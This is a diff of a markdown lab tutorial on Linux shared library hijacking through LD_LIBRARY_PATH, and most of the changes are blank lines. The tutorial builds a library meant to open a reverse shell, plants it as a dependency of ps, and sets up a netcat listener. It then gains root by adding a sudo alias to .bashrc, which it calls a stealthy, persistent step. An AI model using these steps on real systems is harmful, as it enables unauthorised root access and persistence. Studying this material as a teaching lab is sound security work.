@@ -23,6 +23,7 @@ Let’s dive into a practical example. We'll demonstrate how to hijack the execu
 
 ### Writing the Malicious Library
 First, we need to create our malicious library. The following C code defines a library that opens a reverse shell when loaded
+
 ```C
 #include <stdio.h>
 #include <stdlib.h>
@@ -44,9 +45,11 @@ The first four lines consist of standard header files. Following this, `revShell
 
 ### Compiling the Malicious Library
 To compile our shared library, we use the following commands:
+
 ```sh
 gcc -Wall -fPIC -c mylibrary.c -o mylibrary.o
 ```
+
 `-Wall`: Enables all compiler's warning messages.
 `-fPIC`: Generates position-independent code, suitable for shared libraries.
 `-c`: Compiles the code without linking.
@@ -54,6 +57,7 @@ gcc -Wall -fPIC -c mylibrary.c -o mylibrary.o
 
 ### Create the Shared Library
 After compliation is done, we need to create the shared library. This is done by using the `-shared` parameter to tell `gcc` we’re creating a shared library from our object file. We then specify an output file again, this time with the name libhax.so
+
 ```sh
 gcc -shared mylibrary.o -o libmylibrary.so
 ```
@@ -65,13 +69,16 @@ After creating our malicious shared library, the next step is to utilize it. Two
 For this demonstartion we will use the `ps` command as our target. Users often run ps with sudo to display processes with elevated permissions, making it a suitable candidate for our attack.
 
 Let's identify the libraries `ps` uses. We'll use the `ldd` command on the target machine to list these dependencies. The output will include something like:
+
 ```sh
 ldd /bin/ps
 	....
 	libgpg-error.so.0 => /lib/x86_64-linux-gnu/libgpg-error.so.0 (0x00007ffff6614000)
 
 ```
+
 ![bff79b0e3300b9bdd2881248892f6575.png](:/3a3b39d3879b48d1a3af479e76f47448)
+
 The `libgpg-error.so.0` library appears to be a good candidate for hijacking. It handles error reporting and is likely to be loaded but not frequently called during normal operation, minimizing the risk of breaking the program.
 
 ### Setting Up the Environment
@@ -81,15 +88,18 @@ cd /home/msbit/Labs/shared_lib/ld_lib_path
 export LD_LIBRARY_PATH=/home/msbit/Labs/shared_lib/ld_lib_path
 cp libmylibrary.so libgpg-error.so.0
 ```
+
 ![2ee7a19814959b51127c61438b251c78.png](:/ebb5c175064e4af3bc206353d784efdc)
 
 ### Executing the Target Program
 Before running the ps command with our malicious library, we need to set up a netcat listener on the attacker's machine. This listener will wait for the reverse shell connection on port 7777.
+
 ```sh
 rlwrap nc -lvp 7777
 ```
 
 Now, with our environment prepared, we can execute the `ps` command on the victim's machine. 
+
 ```sh
 ps
 ps: /home/msbit/Labs/shared_lib/ld_lib_path/libgpg-error.so.0: no version information available (required by /lib/x86_64-linux-gnu/libgcrypt.so.20)
@@ -101,23 +111,28 @@ Reverse Shell via library hijacking...
 ```
 
 On the attacker's terminal, you should now see the reverse shell connection. This output indicates that the shell is running with the privileges of the user who executed the `ps` command. 
+
 ![0ea16922d15d43b3049304e9d87d14bf.png](:/994fb40e150a4f059b3f42d861b25847)
 
 However, if the `ps` command is run with sudo, no reverse shell will be received at the attacker side.
+
 ![ef5326ad8245461c8940e604c656625a.png](:/d0e330937f7a4f2fb3ed465ed5f8e534)
 
 
 ## Gaining Root Shell
 One of the challenges in exploiting the `LD_LIBRARY_PATH` environment variable is that most modern operating systems do not pass user environment variables when using `sudo`. This behavior is controlled by the `env_reset` setting in the `/etc/sudoers` file, which is enabled by default. When `env_reset` is active, running a command with `sudo` will not include `LD_LIBRARY_PATH` or other user-defined environment variables. This can limit the effectiveness of our library hijacking attempt, as the malicious library won't be loaded when the program is executed with elevated privileges.
+
 ![1d4df0ae25273d88220b7602b9336b24.png](:/85985f67457a41dfa1e8864aa4b7c5a5)
 
 To circumvent this restriction, we can create an alias for `sudo` that includes the `LD_LIBRARY_PATH` variable. This method can be applied temporarily in the current terminal session or more stealthily by adding it to the `.bashrc` file.
 - Temporary Alias:
+- 
 ```sh
 alias sudo='sudo LD_LIBRARY_PATH=/home/msbit/Labs/shared_lib/ld_lib_path'
 ```
 
 - Persistent Alias in .bashrc
+- 
 ```sh
 echo 'alias sudo="sudo LD_LIBRARY_PATH=/home/msbit/Labs/shared_lib/ld_lib_path"' >> ~/.bashrc
 source ~/.bashrc
@@ -125,11 +140,13 @@ source ~/.bashrc
 By setting this alias, any command run with sudo will include our modified `LD_LIBRARY_PATH`.
 
 Let's try again, before running the `ps` command with `sudo`, set up a netcat listener on the attacker's machine to capture the reverse shell. Now, execute the `ps` command with `sudo`
+
 ```sh
 sudo ps
 ```
 
 On the attacker's terminal, you should see the reverse shell connection. This indicates that the shell is now running with root privileges due to the `sudo` command
+
 ![679dbad3e52ce2d0f384aa800a5f31f1.png](:/f8ce7a3d07c34907bd6ead8d5f4299cc)
 
 
